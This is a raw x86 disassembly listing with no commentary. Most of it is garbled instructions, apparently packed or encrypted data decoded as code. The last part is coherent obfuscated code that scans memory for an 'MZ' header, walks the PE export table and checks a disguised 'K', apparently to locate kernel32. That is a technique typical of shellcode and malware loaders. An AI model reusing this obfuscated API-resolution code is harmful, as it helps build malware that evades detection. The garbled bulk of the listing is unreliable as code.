  40bfcc:	out    0x2f,al
  40bfce:	neg    edx
  40bfd0:	cli    
  40bfd1:	gs jecxz 0x40c032
  40bfd4:	out    dx,al
  40bfd5:	ret    
  40bfd6:	rcr    DWORD PTR [edi-0x6c11f3f1],0xd7
  40bfdd:	ins    BYTE PTR es:[edi],dx
  40bfde:	fs jne 0x40c009
  40bfe1:	out    dx,al
  40bfe2:	lods   al,BYTE PTR ds:[esi]
  40bfe3:	in     al,dx
  40bfe4:	lds    esi,FWORD PTR [ebp-0xa4aee2d]
  40bfea:	popf   
  40bfeb:	mov    edi,DWORD PTR [edx+0x34]
  40bfee:	push   ss
  40bfef:	iret   
  40bff0:	sub    cl,BYTE PTR [ebx-0x67]
  40bff3:	xor    ch,BYTE PTR [ecx+0x18]
  40bff6:	fnstsw WORD PTR [esi]
  40bff8:	dec    esp
  40bff9:	jp     0x40c011
  40bffb:	test   dl,0x88
  40bffe:	add    eax,0x123eef59
  40c003:	hlt    
  40c004:	jge    0x40c058
  40c006:	out    dx,eax
  40c007:	inc    eax
  40c008:	jp     0x40c053
  40c00a:	dec    edx
  40c00b:	(bad)  
  40c00c:	mov    ds:0x32ecb19d,al
  40c011:	xchg   esp,eax
  40c012:	mov    bl,0x31
  40c014:	fstp   TBYTE PTR cs:[eax-0x73]
  40c018:	adc    BYTE PTR [eax],0xf4
  40c01b:	cmp    al,0x90
  40c01d:	add    ah,BYTE PTR [edi+0x5c]
  40c020:	stos   DWORD PTR es:[edi],eax
  40c021:	into   
  40c022:	inc    ebx
  40c023:	nop
  40c024:	push   cs
  40c025:	xchg   edi,eax
  40c026:	addr16 push es
  40c028:	test   al,0x4e
  40c02a:	add    ebp,edx
  40c02c:	jno    0x40c074
  40c02e:	jle    0x40c065
  40c030:	rol    BYTE PTR [eax],0x1d
  40c033:	sbb    dh,dl
  40c035:	pop    ebp
  40c036:	jb     0x40c045
  40c038:	rcr    DWORD PTR [esi],1
  40c03a:	scas   eax,DWORD PTR es:[edi]
  40c03b:	and    al,0x62
  40c03d:	push   esp
  40c03e:	ss (bad) 
  40c041:	push   esp
  40c042:	xchg   ecx,eax
  40c043:	xor    al,BYTE PTR [edi+0x592e91d1]
  40c049:	add    DWORD PTR [esi+ecx*8-0x5f],ebp
  40c04d:	in     al,dx
  40c04e:	ret    
  40c04f:	cwde   
  40c050:	pop    ebp
  40c051:	test   BYTE PTR [ebp+0x1e89ef2a],0x25
  40c058:	adc    ebp,eax
  40c05a:	pop    ss
  40c05b:	cmp    al,0x31
  40c05d:	push   esp
  40c05e:	aaa    
  40c05f:	out    0x7b,eax
  40c061:	lahf   
  40c062:	pop    ss
  40c063:	xchg   edi,eax
  40c064:	(bad)  
  40c065:	lock inc ecx
  40c067:	lock cmp BYTE PTR [ecx],bh
  40c06a:	stos   DWORD PTR es:[edi],eax
  40c06b:	xlat   BYTE PTR ds:[ebx]
  40c06c:	cld    
  40c06d:	test   DWORD PTR ds:0x8b984294,0xa742417f
  40c077:	addr16 aaa 
  40c079:	mov    dh,0x94
  40c07b:	jno    0x40c065
  40c07d:	enter  0x7921,0x13
  40c081:	call   0x6aecd71b
  40c086:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c087:	pop    edi
  40c088:	out    dx,eax
  40c089:	mul    DWORD PTR [ecx-0x48]
  40c08c:	and    eax,ebp
  40c08e:	pusha  
  40c08f:	int    0x1
  40c091:	ins    DWORD PTR es:[edi],dx
  40c092:	repnz mov edi,0x165bcfad
  40c098:	jmp    0x40c0bf
  40c09a:	jae    0x40c05e
  40c09c:	fild   QWORD PTR [ebx]
  40c09e:	add    DWORD PTR [esi+0x52],esp
  40c0a1:	push   ebx
  40c0a2:	jnp    0x40c0fe
  40c0a4:	pop    eax
  40c0a5:	push   ebx
  40c0a6:	mov    ah,0x9a
  40c0a8:	jg     0x40c096
  40c0aa:	dec    ebp
  40c0ab:	leave  
  40c0ac:	pushf  
  40c0ad:	out    0x48,al
  40c0af:	cmp    edx,DWORD PTR [edx-0x3390e538]
  40c0b5:	jle    0x40c0cb
  40c0b7:	lods   al,BYTE PTR ds:[esi]
  40c0b8:	iret   
  40c0b9:	into   
  40c0ba:	pop    es
  40c0bb:	jmp    FWORD PTR ds:0xdcaf7769
  40c0c1:	(bad)  
  40c0c2:	cmp    esi,DWORD PTR [esi-0x693dd591]
  40c0c8:	imul   esi,DWORD PTR [edx-0x27dee556],0x1953a8c6
  40c0d2:	push   edi
  40c0d3:	mov    DWORD PTR [ebx+0x75],edx
  40c0d6:	mov    BYTE PTR [eax-0x46],0x73
  40c0da:	(bad)  
  40c0db:	lods   eax,DWORD PTR ds:[esi]
  40c0dc:	push   ecx
  40c0dd:	sbb    BYTE PTR [ebp+0x30],bl
  40c0e0:	sub    BYTE PTR [esi+0x39cea552],ah
  40c0e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c0e7:	(bad)  
  40c0e8:	in     eax,0xbc
  40c0ea:	pusha  
  40c0eb:	jmp    0xaea25711
  40c0f0:	jp     0x40c0c5
  40c0f2:	(bad)  
  40c0f3:	dec    esp
  40c0f4:	fucomi st,st(5)
  40c0f6:	pushf  
  40c0f7:	call   0x74cfcc26
  40c0fc:	jle    0x40c0cc
  40c0fe:	fwait
  40c0ff:	or     edi,DWORD PTR [ebx]
  40c101:	lods   al,BYTE PTR ds:[esi]
  40c102:	iret   
  40c103:	or     edx,DWORD PTR [ecx-0x3f]
  40c106:	or     ebp,DWORD PTR [eax]
  40c108:	rol    DWORD PTR [ecx-0x2dd1faba],0xf9
  40c10f:	and    dl,ch
  40c111:	mov    ebx,0xf67998c3
  40c116:	xchg   edi,eax
  40c117:	mov    dh,0xcf
  40c119:	stos   DWORD PTR es:[edi],eax
  40c11a:	push   esp
  40c11b:	stos   BYTE PTR es:[edi],al
  40c11c:	and    BYTE PTR ds:0x5a4412cd,bh
  40c122:	repz int3 
  40c124:	leave  
  40c125:	pop    esi
  40c126:	sub    esp,DWORD PTR [ebp+0x3d799fad]
  40c12c:	adc    al,0xe0
  40c12e:	mov    ebx,0xd97c0883
  40c133:	into   
  40c134:	cmp    DWORD PTR [ebx+edi*1+0x5e],ebp
  40c138:	pop    es
  40c139:	clc    
  40c13a:	cmp    eax,0x77589fbf
  40c13f:	pop    ebx
  40c140:	gs aaa 
  40c142:	aaa    
  40c143:	hlt    
  40c144:	and    eax,0x6ba2df8f
  40c149:	(bad)  
  40c14b:	push   eax
  40c14c:	jle    0x40c11f
  40c14e:	dec    edx
  40c14f:	aaa    
  40c150:	cmp    al,0x94
  40c152:	les    edx,FWORD PTR [esi+0x45]
  40c155:	jmp    0x9a47:0x6631b80e
  40c15c:	pop    edx
  40c15d:	xchg   esp,eax
  40c15e:	xchg   BYTE PTR [ecx],bh
  40c160:	mov    ah,0xa0
  40c162:	ss xchg ebp,eax
  40c164:	lock out 0xc,eax
  40c167:	neg    ch
  40c169:	mov    al,0xf1
  40c16b:	call   0xc4a065f6
  40c170:	cmp    BYTE PTR [ebx-0x62c07775],al
  40c176:	push   ebp
  40c177:	ret    0x1c5
  40c17a:	jmp    0x867a91f6
  40c17f:	inc    ebp
  40c180:	rol    DWORD PTR [esi+0x68c7c4a1],cl
  40c186:	mov    esp,0xeb3e0e3c
  40c18b:	cmp    cl,bl
  40c18d:	pop    ebx
  40c18e:	jl     0x40c1ae
  40c190:	or     ch,cl
  40c192:	mul    DWORD PTR [ecx-0x7f537850]
  40c198:	ss fwait
  40c19a:	imul   esi,DWORD PTR [ecx],0xfffffff7
  40c19d:	(bad)  
  40c19e:	pop    ebp
  40c19f:	fimul  DWORD PTR [eax+0x6417e801]
  40c1a5:	ds inc edi
  40c1a7:	(bad)  
  40c1a8:	xor    edx,DWORD PTR [eax+0x7990295c]
  40c1ae:	lods   eax,DWORD PTR ds:[esi]
  40c1af:	xchg   bl,ch
  40c1b1:	jecxz  0x40c174
  40c1b3:	pop    es
  40c1b4:	mov    ch,0xb6
  40c1b6:	adc    al,0x71
  40c1b8:	fwait
  40c1b9:	clc    
  40c1ba:	stos   DWORD PTR es:[edi],eax
  40c1bb:	popf   
  40c1bc:	pop    ss
  40c1bd:	int    0x56
  40c1bf:	retf   0xd84b
  40c1c2:	sub    eax,DWORD PTR [ecx+0x22]
  40c1c5:	out    0xd9,al
  40c1c7:	push   edi
  40c1c8:	cmp    BYTE PTR ds:0x713f766,bh
  40c1ce:	std    
  40c1cf:	gs aas 
  40c1d1:	call   0x701b53d7
  40c1d6:	mov    esi,0x18b0cb2
  40c1db:	push   ds
  40c1dc:	dec    edx
  40c1dd:	dec    esp
  40c1de:	ja     0x40c19a
  40c1e0:	cli    
  40c1e1:	cmp    al,0xa0
  40c1e3:	mov    esi,0xe6d6610d
  40c1e8:	addr16 popa 
  40c1ea:	dec    eax
  40c1eb:	add    eax,0x4d3947ea
  40c1f0:	repnz or bh,dl
  40c1f3:	dec    edx
  40c1f4:	stos   BYTE PTR es:[edi],al
  40c1f5:	xchg   cl,cl
  40c1f7:	mov    bh,0x16
  40c1f9:	fst    QWORD PTR [ebp-0x45]
  40c1fc:	call   0x52ac933f
  40c201:	shl    BYTE PTR [eax-0x50da3447],cl
  40c207:	ds loope 0x40c196
  40c20a:	rcr    BYTE PTR [esi+0x56464223],1
  40c210:	inc    ebx
  40c211:	or     DWORD PTR [edi+0xb83fa3e],0x2
  40c218:	fwait
  40c219:	pop    ebx
  40c21a:	test   DWORD PTR [ebp-0x75],esi
  40c21d:	aaa    
  40c21e:	inc    eax
  40c21f:	mov    eax,ds:0x6d122a60
  40c224:	pop    edi
  40c225:	sar    dl,1
  40c227:	(bad)  
  40c228:	stc    
  40c229:	out    dx,al
  40c22a:	inc    ecx
  40c22b:	pop    esp
  40c22c:	mov    ds:0x5d894d88,eax
  40c231:	lock (bad) 
  40c233:	in     eax,0xb1
  40c235:	cmp    DWORD PTR [ecx+0x497ab1ec],esp
  40c23b:	test   BYTE PTR ds:0x6ef7c6ce,ch
  40c241:	cld    
  40c242:	mov    eax,0xaf0f28a
  40c247:	dec    edx
  40c248:	inc    edi
  40c249:	sbb    esi,DWORD PTR [edx-0x2d]
  40c24c:	dec    ecx
  40c24d:	js     0x40c24e
  40c24f:	xor    edx,ebx
  40c251:	(bad)  
  40c252:	xor    eax,DWORD PTR [edx+0x7b]
  40c255:	pushf  
  40c256:	ja     0x40c222
  40c258:	call   0x9fa19561
  40c25d:	mov    DWORD PTR [ecx+0x51],edi
  40c260:	mov    ebx,0xd99f2f56
  40c265:	jns    0x40c221
  40c267:	pop    es
  40c268:	xchg   ecx,eax
  40c269:	sbb    ebp,ecx
  40c26b:	(bad)
  40c26e:	pop    esi
  40c26f:	ror    BYTE PTR [ebx],cl
  40c271:	lds    ebx,FWORD PTR [eax+0x5d]
  40c274:	daa    
  40c275:	ja     0x40c23a
  40c277:	iret   
  40c278:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c279:	stos   BYTE PTR es:[edi],al
  40c27a:	mov    bh,0xdc
  40c27c:	jnp    0x40c205
  40c27e:	(bad)  
  40c27f:	fs jns 0x40c203
  40c282:	mov    esp,0x8e1017dd
  40c287:	or     DWORD PTR fs:[ebx-0x598b7a7f],edi
  40c28e:	stc    
  40c28f:	call   0xa9be3867
  40c294:	lods   eax,DWORD PTR ds:[esi]
  40c295:	adc    ebp,DWORD PTR [ecx+0x1f]
  40c298:	mov    eax,ds:0x83cf4ec3
  40c29d:	ins    DWORD PTR es:[edi],dx
  40c29e:	test   eax,0xd4f7dc23
  40c2a3:	and    edx,esi
  40c2a5:	dec    esp
  40c2a6:	ja     0x40c2ac
  40c2a8:	ss xor eax,0x70232039
  40c2ae:	ss pop esp
  40c2b0:	and    al,0xd2
  40c2b2:	and    edx,ecx
  40c2b4:	les    eax,FWORD PTR ds:0x8f45626b
  40c2ba:	mov    dh,BYTE PTR [edx]
  40c2bc:	cmp    eax,0xabc91a0b
  40c2c1:	adc    eax,0x7ce4e20c
  40c2c6:	out    dx,eax
  40c2c7:	push   ebp
  40c2c8:	pop    esi
  40c2c9:	lods   eax,DWORD PTR ds:[esi]
  40c2ca:	adc    al,0x61
  40c2cc:	imul   DWORD PTR [esi-0x6f]
  40c2cf:	test   al,0xea
  40c2d1:	adc    al,0x85
  40c2d3:	stc    
  40c2d4:	dec    edi
  40c2d5:	into   
  40c2d6:	stos   DWORD PTR es:[edi],eax
  40c2d7:	push   ecx
  40c2d8:	pop    edi
  40c2d9:	xor    esi,eax
  40c2db:	pop    ds
  40c2dc:	and    dl,BYTE PTR [edi]
  40c2de:	outs   dx,WORD PTR ds:[esi]
  40c2e0:	ret    
  40c2e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c2e2:	inc    ebp
  40c2e3:	test   BYTE PTR [ebx+ebp*8-0x2f],0x3c
  40c2e8:	push   ebp
  40c2e9:	lods   eax,DWORD PTR ds:[esi]
  40c2ea:	out    dx,eax
  40c2eb:	push   ebx
  40c2ec:	sbb    BYTE PTR [ebx+0x36],0x2c
  40c2f0:	adc    eax,0xae61c39e
  40c2f5:	sbb    eax,eax
  40c2f7:	cmp    BYTE PTR [edx+ebp*8],bh
  40c2fa:	(bad)
  40c2fe:	popf   
  40c2ff:	lods   al,BYTE PTR ds:[esi]
  40c300:	iret   
  40c301:	mov    dh,0x92
  40c303:	sahf   
  40c304:	jmp    0x40c357
  40c306:	call   0xcb7c:0x8d584e50
  40c30d:	aad    0x77
  40c30f:	fbld   TBYTE PTR [esi-0x7]
  40c312:	adc    esi,DWORD PTR [ebp+0x3eaca920]
  40c318:	inc    esi
  40c319:	pop    ds
  40c31a:	int3   
  40c31b:	mov    edx,DWORD PTR [edi]
  40c31d:	jbe    0x40c2e8
  40c31f:	(bad)  
  40c320:	ror    BYTE PTR [ecx],1
  40c322:	mov    eax,ds:0x528607ce
  40c327:	(bad)  
  40c328:	jmp    0xa3f:0x3840b251
  40c32f:	dec    edi
  40c330:	jge    0x40c339
  40c332:	clc    
  40c333:	fnstenv [esi]
  40c335:	xor    BYTE PTR [ebp+0x31],dh
  40c338:	xchg   BYTE PTR [esp+eax*2+0x7b],dl
  40c33c:	mov    WORD PTR [ebx],cs
  40c33e:	int3   
  40c33f:	lds    edx,FWORD PTR [eax]
  40c341:	clc    
  40c342:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c343:	fistp  QWORD PTR [esi]
  40c345:	xchg   esi,eax
  40c346:	(bad)  
  40c347:	int3   
  40c348:	inc    ebp
  40c349:	push   es
  40c34a:	xor    DWORD PTR [esp+esi*2-0x48],ebp
  40c34e:	and    cl,bl
  40c350:	cmc    
  40c351:	add    DWORD PTR [eax+eax*1+0x61],edx
  40c355:	stos   BYTE PTR es:[edi],al
  40c356:	xchg   BYTE PTR [ebx-0x57],dl
  40c359:	cmp    dl,BYTE PTR [eax+eiz*2-0x71]
  40c35d:	mov    eax,0x85cae2da
  40c362:	inc    cx
  40c364:	sub    DWORD PTR [edi-0x3ac6ff1d],eax
  40c36a:	ja     0x40c340
  40c36c:	mov    eax,0xf72ab1aa
  40c371:	addr16 ja 0x40c3a1
  40c374:	rcr    DWORD PTR [esi+edx*8-0x9],1
  40c378:	arpl   WORD PTR [edx],di
  40c37a:	stc    
  40c37b:	loopne 0x40c3a7
  40c37d:	inc    esi
  40c37e:	mov    DWORD PTR [edi],edi
  40c380:	out    dx,al
  40c381:	xor    eax,0x3a845b3e
  40c386:	jl     0x40c3dd
  40c388:	in     al,0x5
  40c38a:	mov    al,ds:0x77ff0f2
  40c38f:	adc    ecx,0x38d4c87e
  40c395:	stc    
  40c396:	and    eax,0x645f30c
  40c39b:	shl    edx,1
  40c39d:	cwde   
  40c39e:	pushf  
  40c39f:	or     DWORD PTR [ebp-0x2a],ebp
  40c3a2:	(bad)  
  40c3a3:	repz pop es
  40c3a5:	call   0x4ca7:0x9e21ca64
  40c3ac:	mov    ch,0xea
  40c3ae:	std    
  40c3af:	cmp    eax,0xac6dbb41
  40c3b4:	xchg   ebx,ecx
  40c3b6:	xchg   DWORD PTR [ebx+0x21e67715],ecx
  40c3bc:	out    dx,eax
  40c3bd:	nop
  40c3be:	fxch   st(7)
  40c3c0:	adc    ch,bl
  40c3c2:	sahf   
  40c3c3:	mov    ah,0xe0
  40c3c5:	and    al,BYTE PTR [edx]
  40c3c7:	add    al,0xa1
  40c3c9:	jge    0x40c3fd
  40c3cb:	ins    DWORD PTR es:[edi],dx
  40c3cc:	jp     0x40c387
  40c3ce:	into   
  40c3cf:	test   DWORD PTR [esi],ebp
  40c3d1:	ds retf 
  40c3d3:	sub    BYTE PTR ds:0xfff99b14,bh
  40c3d9:	ror    DWORD PTR [ecx],0xe2
  40c3dc:	dec    edx
  40c3dd:	in     al,dx
  40c3de:	mov    WORD PTR [eax],?
  40c3e0:	sub    eax,0x5954eb21
  40c3e5:	mov    esp,ebp
  40c3e7:	mov    esp,0x95284f55
  40c3ec:	aad    0x30
  40c3ee:	aaa    
  40c3ef:	into   
  40c3f0:	add    ebx,DWORD PTR [ebx-0x35]
  40c3f3:	arpl   WORD PTR [esi+0x13e12cc9],di
  40c3f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c3fa:	inc    esi
  40c3fb:	cli    
  40c3fc:	sbb    al,0x30
  40c3fe:	xlat   BYTE PTR ds:[ebx]
  40c3ff:	sub    eax,ecx
  40c401:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c402:	lods   al,BYTE PTR ds:[esi]
  40c403:	dec    eax
  40c404:	jb     0x40c46c
  40c406:	push   eax
  40c407:	or     dl,BYTE PTR [esi]
  40c409:	xlat   BYTE PTR ds:[ebx]
  40c40a:	mov    edi,0xb2c59811
  40c40f:	dec    eax
  40c410:	jge    0x40c3f1
  40c412:	jecxz  0x40c457
  40c414:	adc    ebx,edi
  40c416:	xlat   BYTE PTR ds:[ebx]
  40c417:	sub    esp,esp
  40c419:	pop    edx
  40c41a:	in     al,dx
  40c41b:	push   ebp
  40c41c:	push   ds
  40c41d:	repnz adc eax,0x9ae10d5d
  40c423:	(bad)  
  40c424:	stc    
  40c425:	fwait
  40c426:	xchg   ecx,eax
  40c427:	pop    ebp
  40c428:	dec    esi
  40c429:	hlt    
  40c42a:	pop    ebp
  40c42b:	int3   
  40c42c:	xchg   ebx,eax
  40c42d:	sub    al,0x5
  40c42f:	xchg   edx,eax
  40c430:	shl    BYTE PTR [esi-0x68b693c9],1
  40c436:	sbb    eax,0x113a9a1d
  40c43b:	mov    bh,dh
  40c43d:	iret   
  40c43e:	(bad)  
  40c43f:	imul   esi,DWORD PTR [ecx+0x7e],0x4d3b5744
  40c446:	dec    ebx
  40c447:	sub    eax,ebp
  40c449:	mov    dh,0x6f
  40c44b:	jno    0x40c418
  40c44d:	dec    edi
  40c44e:	gs dec ebp
  40c450:	mov    ch,0xb2
  40c452:	and    dl,BYTE PTR [edi+0x1b]
  40c455:	les    ebx,FWORD PTR [edi-0x2e]
  40c458:	push   0x4ed41cde
  40c45d:	jge    0x40c3e1
  40c45f:	ret    0x8e5c
  40c462:	mov    ch,0x41
  40c464:	sbb    dh,al
  40c466:	int    0x99
  40c468:	in     al,dx
  40c469:	fisub  DWORD PTR ds:0x3f584483
  40c46f:	xchg   esp,eax
  40c470:	jo     0x40c4c2
  40c472:	push   esp
  40c473:	sti    
  40c474:	cmp    eax,0xa9c44783
  40c479:	adc    edi,edx
  40c47b:	mov    edi,0xa8f4a982
  40c480:	sbb    ah,BYTE PTR [esi-0x3dc2224]
  40c486:	(bad)  
  40c487:	repnz sbb al,0xb5
  40c48a:	jmpw   0x257e
  40c48e:	shl    DWORD PTR [ebp-0x7a],0x17
  40c492:	xchg   al,al
  40c494:	push   edx
  40c495:	test   BYTE PTR [ebx-0x63],cl
  40c498:	pop    es
  40c499:	jbe    0x40c42b
  40c49b:	aas    
  40c49c:	xchg   BYTE PTR [eax],dh
  40c49e:	iret   
  40c49f:	ss sbb eax,0xad6f5a8a
  40c4a5:	mov    edx,0x34a96f9a
  40c4aa:	push   es
  40c4ab:	cld    
  40c4ac:	sbb    al,0xad
  40c4ae:	pop    eax
  40c4af:	sub    al,0x68
  40c4b1:	dec    esi
  40c4b2:	sbb    eax,0x2bccf82e
  40c4b7:	test   BYTE PTR [ebp+0x522acd82],dl
  40c4bd:	jmp    0xfe4e3f2d
  40c4c2:	mov    gs,ecx
  40c4c4:	pusha  
  40c4c5:	xchg   esi,eax
  40c4c6:	push   cs
  40c4c7:	div    BYTE PTR [ebp+0x7d3dc883]
  40c4cd:	fsub   st,st(2)
  40c4cf:	test   DWORD PTR [eax+0x552bca2],0xc74a5ef2
  40c4d9:	cmp    DWORD PTR [edx-0x67],ebp
  40c4dc:	pop    esi
  40c4dd:	mov    al,BYTE PTR [eax]
  40c4df:	inc    esi
  40c4e0:	(bad)  
  40c4e2:	inc    eax
  40c4e3:	mov    edi,0x8a2a15ad
  40c4e8:	inc    edi
  40c4e9:	pop    ebx
  40c4ea:	stos   BYTE PTR es:[edi],al
  40c4eb:	outs   dx,DWORD PTR ds:[esi]
  40c4ec:	int3   
  40c4ed:	aas    
  40c4ee:	mov    ss,WORD PTR [esi-0x42ffd27a]
  40c4f4:	(bad)  
  40c4f6:	popf   
  40c4f7:	mul    DWORD PTR [eax+0x9]
  40c4fa:	ret    
  40c4fb:	outs   dx,BYTE PTR ds:[esi]
  40c4fc:	push   es
  40c4fd:	stc    
  40c4fe:	call   0xe04b470c
  40c503:	sbb    al,0xda
  40c505:	nop
  40c506:	sbb    eax,0xd8c57feb
  40c50b:	iret   
  40c50c:	fdiv   st,st(2)
  40c50e:	inc    eax
  40c50f:	ja     0x40c560
  40c511:	pop    ds
  40c512:	scas   eax,DWORD PTR es:[edi]
  40c513:	mov    eax,0x452aeb02
  40c518:	enter  0xb0d3,0x35
  40c51c:	(bad)  
  40c51d:	jl     0x40c51a
  40c51f:	push   cs
  40c520:	(bad)  
  40c521:	push   edi
  40c522:	mov    ds:0x201b7f92,eax
  40c527:	shr    DWORD PTR [eax-0x48],1
  40c52a:	inc    eax
  40c52b:	iret   
  40c52c:	stc    
  40c52d:	repnz mov ds:0x5d7586eb,al
  40c533:	mov    bh,0x2e
  40c535:	dec    esp
  40c536:	call   0x2c108cb7
  40c53b:	mov    edx,0x667bcf34
  40c540:	adc    cl,0xea
  40c543:	mov    ch,0x31
  40c545:	inc    edx
  40c546:	pushf  
  40c547:	push   0x8f6afb53
  40c54c:	sub    eax,0xb17c523b
  40c551:	sbb    ebp,esi
  40c553:	push   ebp
  40c554:	sbb    eax,0xdd518e41
  40c559:	mov    ebx,0xb501368c
  40c55e:	in     al,0x9e
  40c560:	inc    eax
  40c561:	or     DWORD PTR [ebp-0x40],esi
  40c564:	mov    dl,BYTE PTR [ebp-0x32]
  40c567:	aad    0x51
  40c569:	ss enter 0x1778,0x3d
  40c56e:	xor    DWORD PTR [esi+0x7dde1218],esp
  40c574:	mov    DWORD PTR [ecx+esi*4+0x2dbaf061],eax
  40c57b:	jno    0x40c57d
  40c57d:	push   0xe772498f
  40c582:	adc    esi,DWORD PTR [edx+ebp*2+0x7bbfe0e5]
  40c589:	jno    0x40c594
  40c58b:	xchg   DWORD PTR [eax+0x5],ecx
  40c58e:	or     al,0xfa
  40c590:	xchg   edx,eax
  40c591:	call   0x6699:0x513d7e4c
  40c598:	push   edi
  40c599:	enter  0xe1fe,0x6d
  40c59d:	push   ebx
  40c59e:	mov    BYTE PTR [edx-0x13],dh
  40c5a1:	ret    
  40c5a2:	imul   esp,DWORD PTR [ecx+0x37eb55c1],0x5e
  40c5a9:	or     BYTE PTR [eax],dh
  40c5ab:	fs je  0x40c5d8
  40c5ae:	and    eax,0x9992b0a5
  40c5b3:	mov    eax,ds:0xd1dafcfb
  40c5b8:	and    DWORD PTR [ebp-0x6c],ecx
  40c5bb:	mov    ecx,0xf60c1441
  40c5c0:	add    DWORD PTR [esi+0x33],edx
  40c5c3:	xchg   ebp,eax
  40c5c4:	pop    edx
  40c5c5:	cmp    BYTE PTR [ebp+eiz*2+0x0],ch
  40c5c9:	cmp    bh,bl
  40c5cb:	push   esi
  40c5cc:	test   BYTE PTR [ebp-0x56],0x7c
  40c5d0:	outs   dx,DWORD PTR ds:[esi]
  40c5d1:	jmp    0xa961d621
  40c5d6:	pusha  
  40c5d7:	nop
  40c5d8:	aaa    
  40c5d9:	out    dx,eax
  40c5da:	dec    eax
  40c5db:	out    dx,al
  40c5dc:	call   0x173c5b41
  40c5e1:	adc    BYTE PTR [ebx],bl
  40c5e3:	sbb    esi,ebx
  40c5e5:	pop    es
  40c5e6:	jmp    0xbc9eae92
  40c5eb:	dec    edx
  40c5ec:	ja     0x40c5f5
  40c5ee:	cmp    dl,BYTE PTR [eax-0x4a]
  40c5f1:	jae    0x40c576
  40c5f3:	xchg   bh,bh
  40c5f5:	sahf   
  40c5f6:	sbb    edx,DWORD PTR [ebx+0x5b]
  40c5f9:	adc    esi,edx
  40c5fb:	mov    ecx,0xd9602003
  40c600:	push   esi
  40c601:	ja     0x40c5ba
  40c603:	scas   eax,DWORD PTR es:[edi]
  40c604:	shr    DWORD PTR ds:0xb0fd8f01,1
  40c60a:	hlt    
  40c60b:	mov    ecx,0x44033cb0
  40c610:	pop    ss
  40c611:	out    0x28,al
  40c613:	mov    ah,0x8a
  40c615:	mov    dl,BYTE PTR [edi+0xf]
  40c618:	sbb    eax,0xa99124de
  40c61d:	icebp  
  40c61e:	ror    BYTE PTR [ebp+0x3d],cl
  40c621:	into   
  40c622:	xchg   edi,eax
  40c623:	and    al,0x88
  40c625:	xchg   edi,eax
  40c626:	dec    esp
  40c627:	arpl   WORD PTR [esi],cx
  40c629:	rcr    DWORD PTR gs:[edx],cl
  40c62c:	push   ebx
  40c62d:	shl    DWORD PTR [ebp+0x65e61f8a],cl
  40c633:	scas   al,BYTE PTR es:[edi]
  40c634:	xor    eax,ecx
  40c636:	lea    eax,[eax+edi*1+0x64e5c0]
  40c63d:	mov    edi,DWORD PTR [ebp+0xc]
  40c640:	xor    edi,ecx
  40c642:	add    edi,edx
  40c644:	imul   eax,edi
  40c647:	mov    edi,DWORD PTR [ebp+0xc]
  40c64a:	xor    edi,ecx
  40c64c:	sub    edi,eax
  40c64e:	mov    eax,DWORD PTR [ebp-0x4]
  40c651:	add    edi,edx
  40c653:	cmp    DWORD PTR [eax],edi
  40c655:	mov    eax,DWORD PTR [ebp-0x4]
  40c658:	mov    edi,DWORD PTR [ebp+0x10]
  40c65b:	jg     0x40c66e
  40c661:	xor    edi,ecx
  40c663:	mov    ebx,esi
  40c665:	sub    ebx,edi
  40c667:	add    DWORD PTR [eax],ebx
  40c669:	jmp    0x40c674
  40c66e:	xor    edi,ecx
  40c670:	add    edi,edx
  40c672:	add    DWORD PTR [eax],edi
  40c674:	mov    eax,DWORD PTR [ebp-0x8]
  40c677:	mov    edi,DWORD PTR [ebp-0x10]
  40c67a:	mov    eax,DWORD PTR [eax]
  40c67c:	xor    edi,ecx
  40c67e:	add    edi,0x3272df
  40c684:	not    edi
  40c686:	and    eax,edi
  40c688:	movsx  di,BYTE PTR [eax+0x1]
  40c68d:	mov    ebx,0x3b50
  40c692:	sub    di,bx
  40c695:	mov    ebx,0x8a8c
  40c69a:	xor    di,bx
  40c69d:	mov    ebx,0x4f86
  40c6a2:	cmp    di,bx
  40c6a5:	jne    0x40c6cd
  40c6ab:	movsx  di,BYTE PTR [eax]
  40c6af:	mov    ebx,0x3b50
  40c6b4:	sub    di,bx
  40c6b7:	mov    ebx,0x8a8c
  40c6bc:	xor    di,bx
  40c6bf:	mov    ebx,0x4e71
  40c6c4:	cmp    di,bx
  40c6c7:	je     0x40c6dd
  40c6cd:	mov    edi,DWORD PTR [ebp-0x10]
  40c6d0:	xor    edi,ecx
  40c6d2:	mov    ebx,esi
  40c6d4:	sub    ebx,edi
  40c6d6:	add    eax,ebx
  40c6d8:	jmp    0x40c688
  40c6dd:	mov    esi,DWORD PTR [ebp-0x14]
  40c6e0:	mov    esi,DWORD PTR [esi]
  40c6e2:	mov    edi,DWORD PTR [eax+0x3c]
  40c6e5:	lea    esi,[edi+esi*8+0x78]
  40c6e9:	mov    esi,DWORD PTR [esi+eax*1]
  40c6ec:	mov    DWORD PTR [ebp-0x8],esi
  40c6ef:	mov    esi,DWORD PTR [ebp+0x8]
  40c6f2:	xor    esi,ecx
  40c6f4:	add    esi,edx
  40c6f6:	mov    DWORD PTR [ebp-0x14],esi
  40c6f9:	mov    esi,DWORD PTR [ebp+0x8]
  40c6fc:	mov    edi,DWORD PTR [ebp-0x8]
  40c6ff:	xor    esi,ecx
  40c701:	add    esi,edx
  40c703:	pop    ebx
  40c704:	cmp    edi,esi
  40c706:	jne    0x40c724
  40c70c:	mov    eax,DWORD PTR [ebp+0xc]
  40c70f:	xor    eax,ecx
  40c711:	mov    ecx,DWORD PTR [ebp-0x8]
  40c714:	add    eax,edx
  40c716:	imul   eax,ecx
  40c719:	mov    DWORD PTR [ebp-0x8],eax
  40c71c:	push   DWORD PTR [ebp+0x18]
  40c71f:	jmp    0x40c778
  40c724:	mov    ecx,DWORD PTR [ebp-0x8]
  40c727:	add    ecx,eax
  40c729:	mov    DWORD PTR [ebp-0x14],ecx
  40c72c:	mov    ecx,DWORD PTR [ebp-0x14]
  40c72f:	mov    ecx,DWORD PTR [ecx+0xc]
  40c732:	movsx  cx,BYTE PTR [ecx+eax*1]
  40c737:	mov    edx,0x3b50
  40c73c:	sub    cx,dx
  40c73f:	mov    edx,0x8a8c
  40c744:	xor    cx,dx
  40c747:	mov    edx,0x4e77
  40c74c:	cmp    cx,dx
